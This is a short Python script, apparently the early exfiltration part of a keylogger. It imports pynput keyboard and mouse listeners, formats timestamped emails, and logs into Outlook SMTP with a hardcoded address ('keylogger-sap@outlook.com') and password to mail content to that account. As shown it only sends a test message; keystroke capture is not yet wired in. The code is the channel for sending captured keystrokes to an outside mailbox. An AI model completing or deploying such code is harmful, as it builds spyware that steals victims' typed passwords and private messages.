from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText                                                               
from pynput import keyboard, mouse
import smtplib

def timestamp():
    right_now = datetime.now()
    return right_now.strftime('%d/%m/%Y - %H:%M')

def construct_mime(email_address, contents):
    message = MIMEMultipart()
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = timestamp()
    message.attach(MIMEText(contents, 'plain'))
    
    return message

def send_email(email_address, password, contents):
    server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    server.starttls()
    server.login(email_address, password)

    mime_object = construct_mime(email_address, contents)
    server.send_message(mime_object)

    server.quit()

ADDRESS = 'keylogger-sap@outlook.com'
PASSWORD = 'MyK3yLogger124'

send_email(ADDRESS, PASSWORD, 'hello champion!')
